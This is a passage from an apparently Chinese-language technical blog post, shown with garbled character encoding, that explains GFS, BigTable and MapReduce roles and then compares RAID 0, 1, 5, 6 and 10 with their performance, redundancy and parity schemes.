<li>ä¸ºç¬¬ä¸‰æ–¹åº”ç”¨æä¾›å¤§å°ºå¯¸æ–‡ä»¶å­˜å‚¨åŠŸèƒ½</li>
<li>æ–‡ä»¶è¯»æ“ä½œæµç¨‹<ul>
<li>APIä¸Masteré€šä¿¡ï¼Œè·å–æ–‡ä»¶å…ƒä¿¡æ¯</li>
<li>æ ¹æ®æŒ‡å®šçš„è¯»å–ä½ç½®å’Œè¯»å–é•¿åº¦ï¼ŒAPIå‘èµ·å¹¶å‘æ“ä½œï¼Œåˆ†åˆ«ä»è‹¥å¹²ChunkServerä¸Šè¯»å–æ•°æ®</li>
<li>APIç»„è£…æ‰€å¾—æ•°æ®ï¼Œè¿”å›ç»“æœ</li>
</ul>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451849.png" alt="image-20190421212506227"></p>
<h2 id="BigTableçš„ä½œç”¨"><a href="#BigTableçš„ä½œç”¨" class="headerlink" title="BigTableçš„ä½œç”¨"></a>BigTableçš„ä½œç”¨</h2><ul>
<li>ä¸ºGoogleäº‘è®¡ç®—åº”ç”¨ï¼ˆæˆ–ç¬¬ä¸‰æ–¹åº”ç”¨ï¼‰æä¾›æ•°æ®ç»“æ„åŒ–å­˜å‚¨åŠŸèƒ½</li>
<li>ç±»ä¼¼äºæ•°æ®åº“</li>
<li>ä¸ºåº”ç”¨æä¾›ç®€å•æ•°æ®æŸ¥è¯¢åŠŸèƒ½ï¼ˆä¸æ”¯æŒè”åˆæŸ¥è¯¢ï¼‰</li>
<li>ä¸ºMapReduceæä¾›æ•°æ®æºæˆ–æ•°æ®ç»“æœå­˜å‚¨</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451850.png" alt="image-20190421212605526"></p>
<h2 id="BigTableçš„å­˜å‚¨ä¸æœåŠ¡è¯·æ±‚çš„å“åº”"><a href="#BigTableçš„å­˜å‚¨ä¸æœåŠ¡è¯·æ±‚çš„å“åº”" class="headerlink" title="BigTableçš„å­˜å‚¨ä¸æœåŠ¡è¯·æ±‚çš„å“åº”"></a>BigTableçš„å­˜å‚¨ä¸æœåŠ¡è¯·æ±‚çš„å“åº”</h2><ul>
<li><p>åˆ’åˆ†ä¸ºå­è¡¨å­˜å‚¨ï¼Œæ¯ä¸ªå­è¡¨å¯¹åº”ä¸€ä¸ªå­è¡¨æ–‡ä»¶ï¼Œå­è¡¨æ–‡ä»¶å­˜å‚¨äºGFSä¹‹ä¸Š</p>
</li>
<li><p>BigTableé€šè¿‡å…ƒæ•°æ®ç»„ç»‡å­è¡¨</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Tablet 1: &lt;startRowKey1, endRowKey1&gt;, root\bigtable\tablet1,â€¦â€¦</span><br><span class="line">Tablet 2: &lt;startRowKey2, endRowKey2&gt;, root\bigtable\tablet2,â€¦â€¦</span><br><span class="line">Tablet 3: &lt;startRowKey3, endRowKey3&gt;, root\bigtable\tablet3,â€¦â€¦</span><br><span class="line">Tablet 4: &lt;startRowKey4, endRowKey4&gt;, root\bigtable\tablet4,â€¦â€¦</span><br></pre></td></tr></table></figure>
</li>
<li><p>æ¯ä¸ªå­è¡¨éƒ½è¢«åˆ†é…ç»™ä¸€ä¸ªå­è¡¨æœåŠ¡å™¨</p>
</li>
<li><p>ä¸€ä¸ªå­è¡¨æœåŠ¡å™¨å¯åŒæ—¶åˆ†é…å¤šä¸ªå­è¡¨</p>
</li>
<li><p>å­è¡¨æœåŠ¡å™¨è´Ÿè´£å¯¹å¤–æä¾›æœåŠ¡ï¼Œå“åº”æŸ¥è¯¢è¯·æ±‚</p>
</li>
</ul>
<h2 id="MapReduceçš„ä½œç”¨"><a href="#MapReduceçš„ä½œç”¨" class="headerlink" title="MapReduceçš„ä½œç”¨"></a>MapReduceçš„ä½œç”¨</h2><ul>
<li>å¯¹BigTableä¸­çš„æ•°æ®è¿›è¡Œå¹¶è¡Œè®¡ç®—å¤„ç†ï¼ˆå¦‚ç»Ÿè®¡ã€å½’ç±»ç­‰ï¼‰</li>
<li>ä½¿ç”¨BigTableæˆ–GFSå­˜å‚¨è®¡ç®—ç»“æœ</li>
</ul>
<p>masterä¸slaveçš„é€šä¿¡ï¼šç”¨æ–‡ä»¶æ¥åšï¼Œæ°¸ä¹…å¼‚æ­¥é€šä¿¡ã€‚ï¼ˆä¸€èˆ¬CSæ˜¯ç”¨socketæ¥åšçš„ï¼Œå±äºç¬æ—¶é˜»å¡é€šä¿¡ï¼‰è¿›ç¨‹é—´åä½œæ›´ç®€å•ï¼Œå®¹é”™æ€§æ›´å¼ºã€‚ä¸‹å±‚ç”¨GFSæ¥ç®¡ç†ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451851.png" alt="image-20190421212904180"></p>
<h1 id="RAIDç£ç›˜é˜µåˆ—"><a href="#RAIDç£ç›˜é˜µåˆ—" class="headerlink" title="RAIDç£ç›˜é˜µåˆ—"></a>RAIDç£ç›˜é˜µåˆ—</h1><p>åœ¨å•æœºæ—¶ä»£ï¼Œé‡‡ç”¨å•å—ç£ç›˜è¿›è¡Œæ•°æ®å­˜å‚¨å’Œè¯»å†™çš„æ–¹å¼ï¼Œç”±äºå¯»å€å’Œè¯»å†™çš„æ—¶é—´æ¶ˆè€—ï¼Œå¯¼è‡´I&#x2F;Oæ€§èƒ½éå¸¸ä½ï¼Œä¸”å­˜å‚¨å®¹é‡è¿˜ä¼šå—åˆ°é™åˆ¶ã€‚å¦å¤–ï¼Œå•å—ç£ç›˜æå…¶å®¹æ˜“å‡ºç°ç‰©ç†æ•…éšœï¼Œç»å¸¸å¯¼è‡´æ•°æ®çš„ä¸¢å¤±ã€‚å› æ­¤å¤§å®¶å°±åœ¨æƒ³ï¼Œæœ‰æ²¡æœ‰ä¸€ç§åŠæ³•å°†å¤šå—ç‹¬ç«‹çš„ç£ç›˜ç»“åˆåœ¨ä¸€èµ·ç»„æˆä¸€ä¸ªæŠ€æœ¯æ–¹æ¡ˆï¼Œæ¥æé«˜æ•°æ®çš„å¯é æ€§å’ŒI&#x2F;Oæ€§èƒ½å‘¢ã€‚</p>
<p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒRAIDæŠ€æœ¯å°±åº”è¿è€Œç”Ÿäº†ã€‚</p>
<h2 id="RAID-æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#RAID-æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="RAID æ˜¯ä»€ä¹ˆï¼Ÿ"></a>RAID æ˜¯ä»€ä¹ˆï¼Ÿ</h2><p>RAID ï¼ˆ Redundant Array of Independent Disks ï¼‰å³ç‹¬ç«‹ç£ç›˜å†—ä½™é˜µåˆ—ï¼Œç®€ç§°ä¸ºã€Œç£ç›˜é˜µåˆ—ã€ï¼Œå…¶å®å°±æ˜¯ç”¨å¤šä¸ªç‹¬ç«‹çš„ç£ç›˜ç»„æˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå¤§çš„ç£ç›˜ç³»ç»Ÿï¼Œä»è€Œå®ç°æ¯”å•å—ç£ç›˜æ›´å¥½çš„å­˜å‚¨æ€§èƒ½å’Œæ›´é«˜çš„å¯é æ€§ã€‚</p>
<h2 id="RAID-æœ‰å“ªäº›ï¼Ÿ"><a href="#RAID-æœ‰å“ªäº›ï¼Ÿ" class="headerlink" title="RAID æœ‰å“ªäº›ï¼Ÿ"></a>RAID æœ‰å“ªäº›ï¼Ÿ</h2><p>RAIDæ–¹æ¡ˆå¸¸è§çš„å¯ä»¥åˆ†ä¸ºï¼š</p>
<ul>
<li><strong>RAID0</strong></li>
<li><strong>RAID1</strong></li>
<li><strong>RAID5</strong></li>
<li><strong>RAID6</strong></li>
<li><strong>RAID10</strong></li>
</ul>
<h3 id="RAID0"><a href="#RAID0" class="headerlink" title="RAID0"></a>RAID0</h3><p>RAID0 æ˜¯ä¸€ç§éå¸¸ç®€å•çš„çš„æ–¹å¼ï¼Œå®ƒå°†å¤šå—ç£ç›˜ç»„åˆåœ¨ä¸€èµ·å½¢æˆä¸€ä¸ªå¤§å®¹é‡çš„å­˜å‚¨ã€‚å½“æˆ‘ä»¬è¦å†™æ•°æ®çš„æ—¶å€™ï¼Œä¼šå°†æ•°æ®åˆ†ä¸ºNä»½ï¼Œä»¥ç‹¬ç«‹çš„æ–¹å¼å®ç°Nå—ç£ç›˜çš„è¯»å†™ï¼Œé‚£ä¹ˆè¿™Nä»½æ•°æ®ä¼šåŒæ—¶å¹¶å‘çš„å†™åˆ°ç£ç›˜ä¸­ï¼Œå› æ­¤æ‰§è¡Œæ€§èƒ½éå¸¸çš„é«˜ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451852.jpg" alt="img"></p>
<p>å®šä¹‰ï¼š</p>
<p>RAID 0åˆç§°ä¸ºStripeæˆ–Stripingï¼Œå®ƒä»£è¡¨äº†æ‰€æœ‰RAIDçº§åˆ«ä¸­æœ€é«˜çš„å­˜å‚¨æ€§èƒ½ã€‚RAID 0æé«˜å­˜å‚¨æ€§èƒ½çš„åŸç†æ˜¯æŠŠè¿ç»­çš„æ•°æ®åˆ†æ•£åˆ°å¤šä¸ªç£ç›˜ä¸Šå­˜å–ï¼Œè¿™æ ·ï¼Œç³»ç»Ÿæœ‰æ•°æ®è¯·æ±‚å°±å¯ä»¥è¢«å¤šä¸ªç£ç›˜å¹¶è¡Œçš„æ‰§è¡Œï¼Œæ¯ä¸ªç£ç›˜æ‰§è¡Œå±äºå®ƒè‡ªå·±çš„é‚£éƒ¨åˆ†æ•°æ®è¯·æ±‚ã€‚è¿™ç§æ•°æ®ä¸Šçš„å¹¶è¡Œæ“ä½œå¯ä»¥å……åˆ†åˆ©ç”¨æ€»çº¿çš„å¸¦å®½ï¼Œæ˜¾è‘—æé«˜ç£ç›˜æ•´ä½“å­˜å–æ€§èƒ½ã€‚</p>
<p>å·¥ä½œåŸç†ï¼š</p>
<p>ç³»ç»Ÿå‘ä¸‰ä¸ªç£ç›˜ç»„æˆçš„é€»è¾‘ç¡¬ç›˜ï¼ˆRAID0 ç£ç›˜ç»„ï¼‰å‘å‡ºçš„I&#x2F;Oæ•°æ®è¯·æ±‚è¢«è½¬åŒ–ä¸º3é¡¹æ“ä½œï¼Œå…¶ä¸­çš„æ¯ä¸€é¡¹æ“ä½œéƒ½å¯¹åº”äºä¸€å—ç‰©ç†ç¡¬ç›˜ã€‚é€šè¿‡å»ºç«‹RAID 0ï¼ŒåŸå…ˆé¡ºåºçš„æ•°æ®è¯·æ±‚è¢«åˆ†æ•£åˆ°æ‰€æœ‰çš„ä¸‰å—ç¡¬ç›˜ä¸­åŒæ—¶æ‰§è¡Œã€‚ä»ç†è®ºä¸Šè®²ï¼Œä¸‰å—ç¡¬ç›˜çš„å¹¶è¡Œæ“ä½œä½¿åŒä¸€æ—¶é—´å†…ç£ç›˜è¯»å†™é€Ÿåº¦æå‡äº†3å€ã€‚ ä½†ç”±äºæ€»çº¿å¸¦å®½ç­‰å¤šç§å› ç´ çš„å½±å“ï¼Œå®é™…çš„æå‡é€Ÿç‡è‚¯å®šä¼šä½äºç†è®ºå€¼ï¼Œä½†æ˜¯ï¼Œå¤§é‡æ•°æ®å¹¶è¡Œä¼ è¾“ä¸ä¸²è¡Œä¼ è¾“æ¯”è¾ƒï¼Œæé€Ÿæ•ˆæœæ˜¾è‘—æ˜¾ç„¶æ¯‹åº¸ç½®ç–‘ã€‚</p>
<p>ä¼˜ç¼ºç‚¹ï¼š</p>
<p>è¯»å†™æ€§èƒ½æ˜¯æ‰€æœ‰RAIDçº§åˆ«ä¸­æœ€é«˜çš„ã€‚</p>
<p>RAID 0çš„ç¼ºç‚¹æ˜¯ä¸æä¾›æ•°æ®å†—ä½™ï¼Œå› æ­¤ä¸€æ—¦ç”¨æˆ·æ•°æ®æŸåï¼ŒæŸåçš„æ•°æ®å°†æ— æ³•å¾—åˆ°æ¢å¤ã€‚RAID0è¿è¡Œæ—¶åªè¦å…¶ä¸­ä»»ä¸€å—ç¡¬ç›˜å‡ºç°é—®é¢˜å°±ä¼šå¯¼è‡´æ•´ä¸ªæ•°æ®çš„æ•…éšœã€‚ä¸€èˆ¬ä¸å»ºè®®ä¼ä¸šç”¨æˆ·å•ç‹¬ä½¿ç”¨ã€‚</p>
<p>æ€»ç»“ï¼š</p>
<p>ç£ç›˜ç©ºé—´ä½¿ç”¨ç‡ï¼š100%ï¼Œæ•…æˆæœ¬æœ€ä½ã€‚</p>
<p>è¯»æ€§èƒ½ï¼šN*å•å—ç£ç›˜çš„è¯»æ€§èƒ½</p>
<p>å†™æ€§èƒ½ï¼šN*å•å—ç£ç›˜çš„å†™æ€§èƒ½</p>
<p>å†—ä½™ï¼šæ— ï¼Œä»»ä½•ä¸€å—ç£ç›˜æŸåéƒ½å°†å¯¼è‡´æ•°æ®ä¸å¯ç”¨ã€‚</p>
<p>é‚£æœ‰æ²¡æœ‰å¯ä»¥è®©å­˜å‚¨å¯é æ€§å˜é«˜çš„æ–¹æ¡ˆå‘¢ï¼Ÿ<br>æœ‰çš„ï¼Œä¸‹é¢çš„RAID1å°±æ˜¯ã€‚</p>
<h3 id="RAID1"><a href="#RAID1" class="headerlink" title="RAID1"></a>RAID1</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451854.jpg" alt="img"></p>
<p>å®šä¹‰ï¼š</p>
<p>RAID 1é€šè¿‡ç£ç›˜æ•°æ®é•œåƒå®ç°æ•°æ®å†—ä½™ï¼Œåœ¨æˆå¯¹çš„ç‹¬ç«‹ç£ç›˜ä¸Šäº§ç”Ÿäº’ä¸ºå¤‡ä»½çš„æ•°æ®ã€‚å½“åŸå§‹æ•°æ®ç¹å¿™æ—¶ï¼Œå¯ç›´æ¥ä»é•œåƒæ‹·è´ä¸­è¯»å–æ•°æ®ï¼Œå› æ­¤RAID 1å¯ä»¥æé«˜è¯»å–æ€§èƒ½ã€‚RAID 1æ˜¯ç£ç›˜é˜µåˆ—ä¸­å•ä½æˆæœ¬æœ€é«˜çš„ï¼Œä½†æä¾›äº†å¾ˆé«˜çš„æ•°æ®å®‰å…¨æ€§å’Œå¯ç”¨æ€§ã€‚å½“ä¸€ä¸ªç£ç›˜å¤±æ•ˆæ—¶ï¼Œç³»ç»Ÿå¯ä»¥è‡ªåŠ¨åˆ‡æ¢åˆ°é•œåƒç£ç›˜ä¸Šè¯»å†™ï¼Œè€Œä¸éœ€è¦é‡ç»„å¤±æ•ˆçš„æ•°æ®ã€‚</p>
<p>å·¥ä½œåŸç†ï¼š</p>
<p>RAID1æ˜¯å°†ä¸€ä¸ªä¸¤å—ç¡¬ç›˜æ‰€æ„æˆRAIDç£ç›˜é˜µåˆ—ï¼Œå…¶å®¹é‡ä»…ç­‰äºä¸€å—ç¡¬ç›˜çš„å®¹é‡ï¼Œå› ä¸ºå¦ä¸€å—åªæ˜¯å½“ä½œæ•°æ®â€œé•œåƒâ€ã€‚RAID1ç£ç›˜é˜µåˆ—æ˜¾ç„¶æ˜¯æœ€å¯é çš„ä¸€ç§é˜µåˆ—ï¼Œå› ä¸ºå®ƒæ€»æ˜¯ä¿æŒä¸€ä»½å®Œæ•´çš„æ•°æ®å¤‡ä»½ã€‚å®ƒçš„æ€§èƒ½è‡ªç„¶æ²¡æœ‰RAID0ç£ç›˜é˜µåˆ—é‚£æ ·å¥½ï¼Œä½†å…¶æ•°æ®è¯»å–ç¡®å®è¾ƒå•ä¸€ç¡¬ç›˜æ¥çš„å¿«ï¼Œå› ä¸ºæ•°æ®ä¼šä»ä¸¤å—ç¡¬ç›˜ä¸­è¾ƒå¿«çš„ä¸€å—ä¸­è¯»å‡ºã€‚RAID1ç£ç›˜é˜µåˆ—çš„å†™å…¥é€Ÿåº¦é€šå¸¸è¾ƒæ…¢ï¼Œå› ä¸ºæ•°æ®å¾—åˆ†åˆ«å†™å…¥ä¸¤å—ç¡¬ç›˜ä¸­å¹¶åšæ¯”è¾ƒã€‚RAID1ç£ç›˜é˜µåˆ—ä¸€èˆ¬æ”¯æŒâ€œçƒ­äº¤æ¢â€ï¼Œå°±æ˜¯è¯´é˜µåˆ—ä¸­ç¡¬ç›˜çš„ç§»é™¤æˆ–æ›¿æ¢å¯ä»¥åœ¨ç³»ç»Ÿè¿è¡Œæ—¶è¿›è¡Œï¼Œæ— é¡»ä¸­æ–­é€€å‡ºç³»ç»Ÿã€‚RAID1ç£ç›˜é˜µåˆ—æ˜¯ååˆ†å®‰å…¨çš„ï¼Œä¸è¿‡ä¹Ÿæ˜¯è¾ƒè´µä¸€ç§RAIDç£ç›˜é˜µåˆ—è§£å†³æ–¹æ¡ˆï¼Œå› ä¸ºä¸¤å—ç¡¬ç›˜ä»…èƒ½æä¾›ä¸€å—ç¡¬ç›˜çš„å®¹é‡ã€‚RAID1ç£ç›˜é˜µåˆ—ä¸»è¦ç”¨åœ¨æ•°æ®å®‰å…¨æ€§å¾ˆé«˜ï¼Œè€Œä¸”è¦æ±‚èƒ½å¤Ÿå¿«é€Ÿæ¢å¤è¢«ç ´åçš„æ•°æ®çš„åœºåˆã€‚</p>
<p>åœ¨è¿™é‡Œï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè¯»åªèƒ½åœ¨ä¸€å—ç£ç›˜ä¸Šè¿›è¡Œï¼Œå¹¶ä¸ä¼šè¿›è¡Œå¹¶è¡Œè¯»å–ï¼Œæ€§èƒ½å–å†³äºç¡¬ç›˜ä¸­è¾ƒå¿«çš„ä¸€å—ã€‚å†™çš„è¯é€šå¸¸æ¯”å•å—ç£ç›˜è¦æ…¢ï¼Œè™½ç„¶æ˜¯å¹¶è¡Œå†™ï¼Œå³å¯¹ä¸¤å—ç£ç›˜çš„å†™å…¥æ˜¯åŒæ—¶è¿›è¡Œçš„ï¼Œä½†å› ä¸ºè¦æ¯”è¾ƒä¸¤å—ç¡¬ç›˜ä¸­çš„æ•°æ®ï¼Œæ‰€ä»¥æ€§èƒ½æ¯”å•å—ç£ç›˜æ…¢ã€‚</p>
<p>ä¼˜ç¼ºç‚¹ï¼š</p>
<p>RAID1é€šè¿‡ç¡¬ç›˜æ•°æ®é•œåƒå®ç°æ•°æ®çš„å†—ä½™ï¼Œä¿æŠ¤æ•°æ®å®‰å…¨ï¼Œåœ¨ä¸¤å—ç›˜ä¸Šäº§ç”Ÿäº’ä¸ºå¤‡ä»½çš„æ•°æ®ï¼Œå½“åŸå§‹æ•°æ®ç¹å¿™æ—¶ï¼Œå¯ç›´æ¥ä»é•œåƒå¤‡ä»½ä¸­è¯»å–æ•°æ®ï¼Œå› æ­¤RAID1å¯ä»¥æä¾›è¯»å–æ€§èƒ½ã€‚<br>RAID1æ˜¯ç¡¬ç›˜ä¸­å•ä½æˆæœ¬æœ€é«˜çš„ï¼Œä½†æä¾›äº†å¾ˆé«˜çš„æ•°æ®å®‰å…¨æ€§å’Œå¯ç”¨æ€§ï¼Œå½“ä¸€ä¸ªç¡¬ç›˜å¤±æ•ˆæ—¶ï¼Œç³»ç»Ÿå¯ä»¥è‡ªåŠ¨åˆ‡æ¢åˆ°é•œåƒç¡¬ç›˜ä¸Šè¯»&#x2F;å†™ï¼Œå¹¶ä¸”ä¸éœ€è¦é‡ç»„å¤±æ•ˆçš„æ•°æ®ã€‚</p>
<p>æ€»ç»“ï¼š</p>
<p>ç£ç›˜ç©ºé—´ä½¿ç”¨ç‡ï¼š50%ï¼Œæ•…æˆæœ¬æœ€é«˜ã€‚</p>
<p>è¯»æ€§èƒ½ï¼šåªèƒ½åœ¨ä¸€ä¸ªç£ç›˜ä¸Šè¯»å–ï¼Œå–å†³äºç£ç›˜ä¸­è¾ƒå¿«çš„é‚£å—ç›˜</p>
<p>å†™æ€§èƒ½ï¼šä¸¤å—ç£ç›˜éƒ½è¦å†™å…¥ï¼Œè™½ç„¶æ˜¯å¹¶è¡Œå†™å…¥ï¼Œä½†å› ä¸ºè¦æ¯”å¯¹ï¼Œæ•…æ€§èƒ½å•å—ç£ç›˜æ…¢ã€‚</p>
<p>å†—ä½™ï¼šåªè¦ç³»ç»Ÿä¸­ä»»ä½•ä¸€å¯¹é•œåƒç›˜ä¸­æœ‰ä¸€å—ç£ç›˜å¯ä»¥ä½¿ç”¨ï¼Œç”šè‡³å¯ä»¥åœ¨ä¸€åŠæ•°é‡çš„ç¡¬ç›˜å‡ºç°é—®é¢˜æ—¶ç³»ç»Ÿéƒ½å¯ä»¥æ­£å¸¸è¿è¡Œã€‚</p>
<p>äº†è§£äº†RAID0å’ŒRAID1ä¹‹åï¼Œæˆ‘ä»¬å‘ç°è¿™ä¸¤ä¸ªæ–¹æ¡ˆéƒ½ä¸å®Œç¾å•Šã€‚<br>è¿™æ—¶å€™å°±è¯¥ æ€§èƒ½åˆå¥½ã€å¯é æ€§ä¹Ÿé«˜ çš„æ–¹æ¡ˆ RAID5 ç™»åœºäº†ã€‚</p>
<h3 id="RAID5"><a href="#RAID5" class="headerlink" title="RAID5"></a>RAID5</h3><p>è¿™æ˜¯ç›®å‰ç”¨çš„æœ€å¤šçš„ä¸€ç§æ–¹å¼ã€‚<br>å› ä¸º RAID5 æ˜¯ä¸€ç§å°†å­˜å‚¨æ€§èƒ½ã€æ•°æ®å®‰å…¨ã€å­˜å‚¨æˆæœ¬ å…¼é¡¾çš„ä¸€ç§æ–¹æ¡ˆã€‚</p>
<p>åœ¨äº†è§£RAID5ä¹‹å‰ï¼Œæˆ‘ä»¬å¯ä»¥å…ˆç®€å•çœ‹ä¸€ä¸‹RAID3ï¼Œè™½ç„¶RAID3ç”¨çš„å¾ˆå°‘ï¼Œä½†å¼„æ¸…æ¥šäº†RAID3å°±å¾ˆå®¹æ˜“æ˜ç™½RAID5çš„æ€è·¯ã€‚</p>
<p>RAID3çš„æ–¹å¼æ˜¯ï¼šå°†æ•°æ®æŒ‰ç…§RAID0çš„å½¢å¼ï¼Œåˆ†æˆå¤šä»½åŒæ—¶å†™å…¥å¤šå—ç£ç›˜ï¼Œä½†æ˜¯è¿˜ä¼šå¦å¤–å†ç•™å‡ºä¸€å—ç£ç›˜ç”¨äºå†™ã€Œå¥‡å¶æ ¡éªŒç ã€ã€‚ä¾‹å¦‚æ€»å…±æœ‰Nå—ç£ç›˜ï¼Œé‚£ä¹ˆå°±ä¼šè®©å…¶ä¸­é¢åº¦N-1å—ç”¨æ¥å¹¶å‘çš„å†™æ•°æ®ï¼Œç¬¬Nå—ç£ç›˜ç”¨è®°å½•æ ¡éªŒç æ•°æ®ã€‚ä¸€æ—¦æŸä¸€å—ç£ç›˜åæ‰äº†ï¼Œå°±å¯ä»¥åˆ©ç”¨å…¶å®ƒçš„N-1å—ç£ç›˜å»æ¢å¤æ•°æ®ã€‚</p>
<p>ä½†æ˜¯ç”±äºç¬¬Nå—ç£ç›˜æ˜¯æ ¡éªŒç ç£ç›˜ï¼Œå› æ­¤æœ‰ä»»ä½•æ•°æ®çš„å†™å…¥éƒ½ä¼šè¦å»æ›´æ–°è¿™å—ç£ç›˜ï¼Œå¯¼è‡´è¿™å—ç£ç›˜çš„è¯»å†™æ˜¯æœ€é¢‘ç¹çš„ï¼Œä¹Ÿå°±éå¸¸çš„å®¹æ˜“æŸåã€‚</p>
<p>RAID5çš„æ–¹å¼å¯ä»¥è¯´æ˜¯å¯¹RAID3è¿›è¡Œäº†æ”¹è¿›ã€‚</p>
<p>RAID5æ¨¡å¼ä¸­ï¼Œä¸å†éœ€è¦ç”¨å•ç‹¬çš„ç£ç›˜å†™æ ¡éªŒç äº†ã€‚å®ƒæŠŠæ ¡éªŒç ä¿¡æ¯åˆ†å¸ƒåˆ°å„ä¸ªç£ç›˜ä¸Šã€‚ä¾‹å¦‚ï¼Œæ€»å…±æœ‰Nå—ç£ç›˜ï¼Œé‚£ä¹ˆä¼šå°†è¦å†™å…¥çš„æ•°æ®åˆ†æˆNä»½ï¼Œå¹¶å‘çš„å†™å…¥åˆ°Nå—ç£ç›˜ä¸­ï¼ŒåŒæ—¶è¿˜å°†æ•°æ®çš„æ ¡éªŒç ä¿¡æ¯ä¹Ÿå†™å…¥åˆ°è¿™Nå—ç£ç›˜ä¸­ï¼ˆæ•°æ®ä¸å¯¹åº”çš„æ ¡éªŒç ä¿¡æ¯å¿…é¡»å¾—åˆ†å¼€å­˜å‚¨åœ¨ä¸åŒçš„ç£ç›˜ä¸Šï¼‰ã€‚ä¸€æ—¦æŸä¸€å—ç£ç›˜æŸåäº†ï¼Œå°±å¯ä»¥ç”¨å‰©ä¸‹çš„æ•°æ®å’Œå¯¹åº”çš„å¥‡å¶æ ¡éªŒç ä¿¡æ¯å»æ¢å¤æŸåçš„æ•°æ®ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451855.jpg" alt="img"></p>
<p>RAID5æ ¡éªŒä½ç®—æ³•åŸç†ï¼šP &#x3D; D1 xor D2 xor D3 â€¦ xor Dn ï¼ˆD1,D2,D3 â€¦ Dnä¸ºæ•°æ®å—ï¼ŒPä¸ºæ ¡éªŒï¼Œxorä¸ºå¼‚æˆ–è¿ç®—ï¼‰</p>
<p>RAID5çš„æ–¹å¼ï¼Œæœ€å°‘éœ€è¦ä¸‰å—ç£ç›˜æ¥ç»„å»ºç£ç›˜é˜µåˆ—ï¼Œå…è®¸æœ€å¤šåŒæ—¶åä¸€å—ç£ç›˜ã€‚å¦‚æœæœ‰ä¸¤å—ç£ç›˜åŒæ—¶æŸåäº†ï¼Œé‚£æ•°æ®å°±æ— æ³•æ¢å¤äº†ã€‚</p>
<h3 id="RAID6"><a href="#RAID6" class="headerlink" title="RAID6"></a>RAID6</h3><p>ä¸ºäº†è¿›ä¸€æ­¥æé«˜å­˜å‚¨çš„é«˜å¯ç”¨ï¼Œèªæ˜çš„äººä»¬åˆæå‡ºäº†RAID6æ–¹æ¡ˆï¼Œå¯ä»¥åœ¨æœ‰ä¸¤å—ç£ç›˜åŒæ—¶æŸåçš„æƒ…å†µä¸‹ï¼Œä¹Ÿèƒ½ä¿éšœæ•°æ®å¯æ¢å¤ã€‚</p>
<p>ä¸ºä»€ä¹ˆRAID6è¿™ä¹ˆç‰›å‘¢ï¼Œå› ä¸ºRAID6åœ¨RAID5çš„åŸºç¡€ä¸Šå†æ¬¡æ”¹è¿›ï¼Œå¼•å…¥äº†åŒé‡æ ¡éªŒçš„æ¦‚å¿µã€‚</p>
<p>RAID6é™¤äº†æ¯å—ç£ç›˜ä¸Šéƒ½æœ‰åŒçº§æ•°æ®XORæ ¡éªŒåŒºä»¥å¤–ï¼Œè¿˜æœ‰é’ˆå¯¹æ¯ä¸ªæ•°æ®å—çš„XORæ ¡éªŒåŒºï¼Œè¿™æ ·çš„è¯ï¼Œç›¸å½“äºæ¯ä¸ªæ•°æ®å—æœ‰ä¸¤ä¸ªæ ¡éªŒä¿æŠ¤æªæ–½ï¼Œå› æ­¤æ•°æ®çš„å†—ä½™æ€§æ›´é«˜äº†ã€‚</p>
<p>ä½†æ˜¯RAID6çš„è¿™ç§è®¾è®¡ä¹Ÿå¸¦æ¥äº†å¾ˆé«˜çš„å¤æ‚åº¦ï¼Œè™½ç„¶æ•°æ®å†—ä½™æ€§å¥½ï¼Œè¯»å–çš„æ•ˆç‡ä¹Ÿæ¯”è¾ƒé«˜ï¼Œä½†æ˜¯å†™æ•°æ®çš„æ€§èƒ½å°±å¾ˆå·®ã€‚å› æ­¤RAID6åœ¨å®é™…ç¯å¢ƒä¸­åº”ç”¨çš„æ¯”è¾ƒå°‘ã€‚</p>
<h3 id="RAID10"><a href="#RAID10" class="headerlink" title="RAID10"></a>RAID10</h3><p>RAID10å…¶å®å°±æ˜¯RAID1ä¸RAID0çš„ä¸€ä¸ªåˆä½“ã€‚</p>
<p>æˆ‘ä»¬çœ‹å›¾å°±æ˜ç™½äº†ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451856.jpg" alt="img"></p>
<p>RAID10å…¼å¤‡äº†RAID1å’ŒRAID0çš„æœ‰ä¼˜ç‚¹ã€‚é¦–å…ˆåŸºäºRAID1æ¨¡å¼å°†ç£ç›˜åˆ†ä¸º2ä»½ï¼Œå½“è¦å†™å…¥æ•°æ®çš„æ—¶å€™ï¼Œå°†æ‰€æœ‰çš„æ•°æ®åœ¨ä¸¤ä»½ç£ç›˜ä¸ŠåŒæ—¶å†™å…¥ï¼Œç›¸å½“äºå†™äº†åŒä»½æ•°æ®ï¼Œèµ·åˆ°äº†æ•°æ®ä¿éšœçš„ä½œç”¨ã€‚ä¸”åœ¨æ¯ä¸€ä»½ç£ç›˜ä¸Šåˆä¼šåŸºäºRAID0æŠ€æœ¯è®²æ•°æ®åˆ†ä¸ºNä»½å¹¶å‘çš„è¯»å†™ï¼Œè¿™æ ·ä¹Ÿä¿éšœäº†æ•°æ®çš„æ•ˆç‡ã€‚</p>
<p>ä½†ä¹Ÿå¯ä»¥çœ‹å‡ºRAID10æ¨¡å¼æ˜¯æœ‰ä¸€åŠçš„ç£ç›˜ç©ºé—´ç”¨äºå­˜å‚¨å†—ä½™æ•°æ®çš„ï¼Œæµªè´¹çš„å¾ˆä¸¥é‡ï¼Œå› æ­¤ç”¨çš„ä¹Ÿä¸æ˜¯å¾ˆå¤šã€‚</p>
<p><strong>æ•´ä½“å¯¹æ¯”ä¸€ä¸‹</strong> RAID0ã€RAID1ã€RAID5ã€RAID6ã€RAID10 çš„å‡ ä¸ªç‰¹å¾ï¼š</p>
